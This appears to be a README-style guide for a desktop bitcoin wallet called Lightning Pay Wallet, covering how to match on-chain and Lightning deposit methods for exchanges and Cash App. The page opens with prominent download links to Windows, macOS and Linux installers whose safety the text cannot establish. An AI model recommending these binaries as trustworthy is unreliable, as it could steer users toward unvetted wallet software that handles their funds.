<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# Moving bitcoin between Lightning Pay and exchanges or Cash App
Deposit methods decide everything. Match the rail and the transfer is boring.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

Exchanges and custodial apps accept bitcoin in more than one form, and each form has its own deposit
method. The transfer works when the method matches the rail you send on, and fails when it does not.
This page is about getting that match right.

## Read the deposit screen first

Before sending anything, open the deposit screen of the service and note which method it is offering:
an on-chain address, a Lightning invoice, or a choice between the two. That screen is the
specification for the transfer.

An on-chain address looks like `bc1...` and needs an on-chain send. A Lightning invoice begins `lnbc`
and needs a Lightning payment. They are not interchangeable, and a mismatch is not something the
wallet can undo.

## Sending from Lightning Pay

For an on-chain deposit, use the on-chain send and paste the address. For a Lightning deposit, use
the Lightning send and paste the invoice. Check the amount twice: an on-chain transaction is final
once broadcast, and a Lightning payment is final once settled.

If the service requires a memo or tag for the deposit, put it where the service asks for it. The
wallet has no field for a memo because the memo belongs to the exchange's accounting, not to the
payment.

## Cash App and similar apps

Cash App supports both rails for some accounts and one for others, and its limits and eligibility
rules are its own. The wallet's job ends when the payment settles; anything the app refuses, restricts
or delays afterwards is a matter between you and the app.

That includes the messages people search for most: a send that is not eligible, a withdrawal that is
blocked, a balance that cannot be cashed out. None of those are wallet faults, and none can be fixed
from the wallet.

## Withdrawing back to the wallet

The reverse direction follows the same rule. Take the method the service offers, paste it into the
wallet, and wait. A Lightning withdrawal arrives in seconds; an on-chain withdrawal waits for blocks.

If a withdrawal does not arrive, check the transaction on a block explorer before assuming a wallet
bug. An on-chain transaction that exists on the network exists whether or not your interface has
caught up.

## The mistakes that cost money

Sending on the wrong network. Sending to an address copied from a chat without checking the first and
last characters. Sending a test-sized amount to a new destination and then the real amount before the
first has arrived. Each is common, and only the third is recoverable by patience.

## Questions people ask

### Can I send bitcoin from the wallet to Coinbase or Binance?

Yes, by using the deposit method those services give you. Lightning deposits need a Lightning invoice;
on-chain deposits need an address.

### Why does the exchange say the deposit is unconfirmed?

Because it is on-chain and waiting for blocks. Lightning deposits do not have this state.

### Can I send directly to a friend's Cash App?

Only if their app gives you an invoice or an address. Both apps need the request to come from the
receiving side; there is no way to push bitcoin at a tag.

## Related guides

- [Cashing out bitcoin to a bank account](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/cash-out-bitcoin-to-a-bank.md)
- [Buying bitcoin and where you can actually spend it](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/buy-and-spend-bitcoin.md)
- [Sending bitcoin between the on-chain network and Lightning](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/on-chain-to-lightning-transfers.md)

